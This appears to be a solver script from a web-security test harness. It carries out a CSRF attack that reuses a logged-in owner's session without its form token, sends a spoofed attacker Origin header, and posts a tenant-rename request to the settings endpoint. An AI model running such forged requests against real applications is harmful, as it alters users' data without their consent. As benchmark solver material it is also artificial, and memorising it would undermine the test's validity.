// A cross-site page replays the victim's settings form against the app using the ambient session
// cookie, carrying a foreign Origin and no form token, and the tenant rename still lands.
import type { SolverCtx, SolverSession } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const owner = await ctx.login('persona_a')
  const forged: SolverSession = { ...owner, csrfToken: undefined }
  const body = new URLSearchParams({ name: 'Rebranded Holdings' }).toString()
  await ctx.fetch(ctx.path('updateSettings'), {
    method: 'POST',
    session: forged,
    headers: {
      'content-type': 'application/x-www-form-urlencoded',
      origin: 'https://acme-attacker.example.test',
    },
    body,
  })
}
